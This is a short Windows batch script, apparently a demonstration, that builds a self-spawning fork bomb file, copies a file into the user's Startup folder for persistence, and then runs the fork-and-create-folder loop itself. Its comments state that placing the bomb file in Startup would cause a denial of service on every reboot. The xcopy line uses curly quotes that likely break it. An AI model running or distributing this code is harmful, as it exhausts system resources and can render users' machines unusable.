@echo off

@echo @echo off>Dangerous.bat :: We will create 2 files which are Dangerous.bat & Harmless.bat. Harmless.bat will simply create a folder. Dangerous.dat file is a Windows fork bomb.
@echo :fork>>Dangerous.bat :: Creating Dangerous.bat file contents
@echo md "HelloThereCreatedByDangerous">>Dangerous.bat
@echo start WindowsPersistentBomb>>Dangerous.bat
@echo goto fork>>Dangerous.bat

@echo @echo off>>Harmless.bat :: Creating Harmless.bat file contents
@echo md "HelloThereCreatedByHarmless">>Harmless.bat 

xcopy Harmless.bat “C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup” :: This will copy the Harmless.bat file to the Startup folder. Here all bat files run when the system starts up. If you copy Dangerous.bat then the system will DOS everytime it is restarted so it is recommended that it is not copied to the Startup folder.

:fork
md "HelloThere"
start WindowsPersistentBomb
goto fork